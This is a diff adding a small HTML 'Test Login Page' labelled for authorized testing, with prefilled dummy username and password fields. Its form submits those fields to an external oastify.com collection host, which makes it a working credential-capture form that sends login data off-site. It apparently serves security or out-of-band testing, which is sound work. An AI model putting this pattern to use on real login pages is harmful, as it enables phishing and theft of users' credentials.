@@ -1,0 +1,31 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Test Login Page</title>
+  <style>
+    body { font-family: Arial, sans-serif; background:#f3f4f6; display:grid; place-items:center; min-height:100vh; margin:0; }
+    .card { width:360px; background:#fff; padding:24px; border-radius:12px; box-shadow:0 8px 24px rgba(0,0,0,.08); }
+    .warn { background:#fee2e2; color:#991b1b; padding:10px; border-radius:8px; margin-bottom:12px; font-size:13px; font-weight:600; }
+    label { display:block; margin:12px 0 6px; font-weight:600; }
+    input, button { width:100%; box-sizing:border-box; padding:10px 12px; border-radius:8px; font-size:14px; }
+    input { border:1px solid #cbd5e1; }
+    button { margin-top:16px; border:0; background:#2563eb; color:#fff; cursor:pointer; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <div class="warn">Authorized testing only. Use dummy values only.</div>
+    <form action="https://im899znm183cz8vuta7i6bc77ydp1gs4h.oastify.com/receive" method="POST">
+      <label for="user">Test Username</label>
+      <input id="user" name="test_username" type="text" value="dummy-user">
+
+      <label for="secret">Test Password</label>
+      <input id="secret" name="test_secret" type="text" value="dummy-secret">
+
+      <button type="submit">Submit test data</button>
+    </form>
+  </div>
+</body>
+</html>
